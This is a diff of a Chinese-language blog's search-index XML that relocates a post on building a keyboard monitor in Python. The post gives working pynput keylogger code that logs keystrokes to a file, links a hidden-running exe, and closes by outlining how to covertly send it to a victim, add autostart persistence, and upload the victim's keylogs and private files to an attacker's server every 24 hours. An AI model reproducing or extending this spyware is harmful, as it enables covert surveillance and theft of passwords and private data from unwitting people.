-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641028433467-8ac74fe5-4ea6-4a82-82e5-7b74de48c9e1.png" alt="img"></p>
-<h1 id="三、软件下载与使用"><a href="#三、软件下载与使用" class="headerlink" title="三、软件下载与使用"></a>三、软件下载与使用</h1><ul>
-<li>已将程序文件打包exe，软件下载地址：<a href="https://github.com/w01ke/Keyboard_Record">https://github.com/w01ke/Keyboard_Record</a> ，下载完成后双击w01ke.exe即可运行</li>
-<li>当双击w01ke.exe后，程序就已经在后台运行，监控用户的键盘输入，并将信息存入D盘中的w01ke.txt文件中。</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641029670450-8750c4c6-f77b-41d6-9acc-cf4e6be5306c.png" alt="img"></p>
-<ul>
-<li>如果需要退出程序，打开任务管理器，找到w01ke.exe，选中结束任务即可。</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641027626425-396c9df2-d6a4-460e-b300-c01ddfb299df.png" alt="img"></p>
-<h1 id="四、点评"><a href="#四、点评" class="headerlink" title="四、点评"></a>四、点评</h1><p>&emsp;&emsp;上面代码其实存在很多的缺陷，如果你是一个黑客的话，你可能可以通过用户使用<strong>tab</strong>键切换表单来判断输入框的间隔，或者通过其他分析手段，但是这样并不是很智能，我们其实可以尝试通过鼠标点击来截断输出，这样就可以连贯的看到用户输入的词了，快来尝试一下吧！  </p>
-<h1 id="五、一些思考"><a href="#五、一些思考" class="headerlink" title="五、一些思考"></a>五、一些思考</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641031204207-f7ab1c34-d684-47e7-ab23-8878f3f82075.png" alt="img"></p>
-<p>&emsp;&emsp;作为一名黑客，如果不是监控自己的电脑，而是想要监控他人的键盘输入情况，我们可以改进程序代码，将w01ke.exe文件发送给小明，当小明双击运行w01ke.exe后，因为没有可视化界面，因此表面看起来无事发生，但w01ke.exe已经在后台运行，如果没有一些计算机常识，小明也不会检查后台进程发现的。但这样还不够，如果小明重启电脑了，那我们的w01ke.exe就退出了，因此我们需要在程序代码中加入一些自启动的相关代码，让小明开机，w01ke.exe文件就自动在后台运行了，或者引诱小明自己每次打开电脑都运行w01ke.exe。</p>
-<p>&emsp;&emsp;但这还不够，小明的记录键盘操作的w01ke.txt如何发送到我们自己的电脑上呢？一是可以直接发送文件给我们具有公网IP的服务器上；二是直接与我们的服务器建立连接，但这可能会报毒；三是我们可以自己做一个网站页面，接收提交文件的表单，w01ke.exe设置好，每隔24h自动访问该网站，并自动在后台将w01ke.txt，甚至小明其他的隐私文件也可以，自动通过网页的形式上传到我们的云服务器上，我们在服务器上即可看到小明的键盘记录以及其他隐私文件，而我之前又刚好写过这方面的程序。</p>
-<p>&emsp;&emsp;当然这只是作为一名黑客角度思考的可能实现的攻击方式，后续我也将尝试实现这些功能</p>
-]]></content>
-      <categories>
-        <category>Python</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>常见Android组件/控件漏洞</title>
     <url>/post/cb60dfd6.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>&emsp;&emsp;对于 Android app 本身来说，也是会存在一些组件安全漏洞的，本文就介绍一些常见的 Android 组件漏洞。</p>
@@ -2961,6 +2920,47 @@
       <tags>
         <tag>移动安全</tag>
         <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>想要监控键盘？Python搞定！</title>
+    <url>/post/90a9d002.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>如果将电脑暂时给他人用，如何监控别人在我们电脑使用键盘敲了些什么东西呢？</p>
+<p>软件下载地址：<a href="https://github.com/w01ke/Keyboard_Record">https://github.com/w01ke/Keyboard_Record</a> ，下载完成后双击w01ke.exe即可运行</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20220101190041070.png" alt="image-20220101190041070"></p>
+<h1 id="一、环境依赖"><a href="#一、环境依赖" class="headerlink" title="一、环境依赖"></a>一、环境依赖</h1><p>需要安装pynput模块，可以使用pip安装</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install pynput</span><br></pre></td></tr></table></figure>
+
+<p>也可以在pycharm的<strong>settings&gt;interpreter中安装</strong></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019883218-4ab81692-8192-45dd-883e-3cddad557704.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019901019-1d8dd10c-1e69-4afe-9e8b-72e0819ee081.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641019919002-aeefc97f-e784-4cfa-b46b-4b0c1cc2fd5b.png" alt="img"></p>
+<h1 id="二、相关代码"><a href="#二、相关代码" class="headerlink" title="二、相关代码"></a>二、相关代码</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pynput.keyboard <span class="keyword">import</span> Key, Controller, Listener</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">keyboard = Controller()</span><br><span class="line">keys = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_press</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="built_in">str</span>(key).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_release</span>(<span class="params">key</span>):</span></span><br><span class="line">    <span class="keyword">global</span> keys</span><br><span class="line">    string = <span class="built_in">str</span>(key).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    keys.append(<span class="string">&#x27;\r&#x27;</span> + string)</span><br><span class="line">    <span class="built_in">print</span>(keys)</span><br><span class="line">    main_string = <span class="string">&quot;&quot;</span>.join(keys)</span><br><span class="line">    <span class="built_in">print</span>(main_string)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(main_string) &gt; <span class="number">15</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;D:/w01ke.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(main_string)</span><br><span class="line">            keys = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> Listener(on_press=on_press, on_release=on_release) <span class="keyword">as</span> listener:</span><br><span class="line">    listener.join()</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>这里会将键盘记录传入<strong>D:/w01ke.txt</strong></li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641028433467-8ac74fe5-4ea6-4a82-82e5-7b74de48c9e1.png" alt="img"></p>
+<h1 id="三、软件下载与使用"><a href="#三、软件下载与使用" class="headerlink" title="三、软件下载与使用"></a>三、软件下载与使用</h1><ul>
+<li>已将程序文件打包exe，软件下载地址：<a href="https://github.com/w01ke/Keyboard_Record">https://github.com/w01ke/Keyboard_Record</a> ，下载完成后双击w01ke.exe即可运行</li>
+<li>当双击w01ke.exe后，程序就已经在后台运行，监控用户的键盘输入，并将信息存入D盘中的w01ke.txt文件中。</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641029670450-8750c4c6-f77b-41d6-9acc-cf4e6be5306c.png" alt="img"></p>
+<ul>
+<li>如果需要退出程序，打开任务管理器，找到w01ke.exe，选中结束任务即可。</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641027626425-396c9df2-d6a4-460e-b300-c01ddfb299df.png" alt="img"></p>
+<h1 id="四、点评"><a href="#四、点评" class="headerlink" title="四、点评"></a>四、点评</h1><p>&emsp;&emsp;上面代码其实存在很多的缺陷，如果你是一个黑客的话，你可能可以通过用户使用<strong>tab</strong>键切换表单来判断输入框的间隔，或者通过其他分析手段，但是这样并不是很智能，我们其实可以尝试通过鼠标点击来截断输出，这样就可以连贯的看到用户输入的词了，快来尝试一下吧！  </p>
+<h1 id="五、一些思考"><a href="#五、一些思考" class="headerlink" title="五、一些思考"></a>五、一些思考</h1><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1641031204207-f7ab1c34-d684-47e7-ab23-8878f3f82075.png" alt="img"></p>
+<p>&emsp;&emsp;作为一名黑客，如果不是监控自己的电脑，而是想要监控他人的键盘输入情况，我们可以改进程序代码，将w01ke.exe文件发送给小明，当小明双击运行w01ke.exe后，因为没有可视化界面，因此表面看起来无事发生，但w01ke.exe已经在后台运行，如果没有一些计算机常识，小明也不会检查后台进程发现的。但这样还不够，如果小明重启电脑了，那我们的w01ke.exe就退出了，因此我们需要在程序代码中加入一些自启动的相关代码，让小明开机，w01ke.exe文件就自动在后台运行了，或者引诱小明自己每次打开电脑都运行w01ke.exe。</p>
+<p>&emsp;&emsp;但这还不够，小明的记录键盘操作的w01ke.txt如何发送到我们自己的电脑上呢？一是可以直接发送文件给我们具有公网IP的服务器上；二是直接与我们的服务器建立连接，但这可能会报毒；三是我们可以自己做一个网站页面，接收提交文件的表单，w01ke.exe设置好，每隔24h自动访问该网站，并自动在后台将w01ke.txt，甚至小明其他的隐私文件也可以，自动通过网页的形式上传到我们的云服务器上，我们在服务器上即可看到小明的键盘记录以及其他隐私文件，而我之前又刚好写过这方面的程序。</p>
+<p>&emsp;&emsp;当然这只是作为一名黑客角度思考的可能实现的攻击方式，后续我也将尝试实现这些功能</p>
+]]></content>
+      <categories>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
